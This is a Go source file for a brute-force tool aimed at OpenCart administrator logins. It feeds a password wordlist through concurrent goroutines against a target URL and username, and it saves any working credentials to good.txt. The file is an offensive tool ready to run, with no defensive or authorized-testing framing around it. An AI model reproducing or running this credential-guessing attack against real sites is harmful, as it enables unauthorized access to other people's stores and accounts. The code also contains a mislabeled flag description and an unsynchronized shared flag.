package main

import (
	"bufio"
	"flag"
	"fmt"
	"github.com/sibkod/cms_brute/brute/opencart"
	"os"
	"sync"
)

var passwordCh = make(chan string)
var AlreadyFound = false

func argParse() (string, string, string, int) {
	passList := flag.String("p", "./dic/pass.txt", "Pass list.")
	login := flag.String("l", "", "File to decrypt. (Required)")
	link := flag.String("u", "", "Url.")
	threads := flag.Int("t", 5, "Threads.")
	flag.Parse()
	return *link, *login, *passList, *threads
}

func main() {

	link, login, passList, threads := argParse()
	wg := new(sync.WaitGroup)

	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(link string, login string) {
			defer wg.Done()
			for {
				pass, ok := <-passwordCh
				if ok {
					found := opencart.Start(link, login, pass)
					if found {
						AlreadyFound = true

						f, err := os.OpenFile("./good.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
						if err != nil {
							panic(err)
						}
						defer f.Close()
						fmt.Fprintf(f, "%s %s:%s", link, login, pass)
						fmt.Printf("[+]Found  %s  [%s:%s] \n", link, login, pass)
						break
					}
				} else {
					break
				}
			}
		}(link, login)
	}

	file, err := os.Open(passList)
	defer file.Close()
	if err != nil {
		panic(err)
	}

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	for scanner.Scan() {
		if AlreadyFound {
			break
		}
		passwordCh <- scanner.Text()
	}
	close(passwordCh)
	wg.Wait()

	fmt.Println("Done")
}
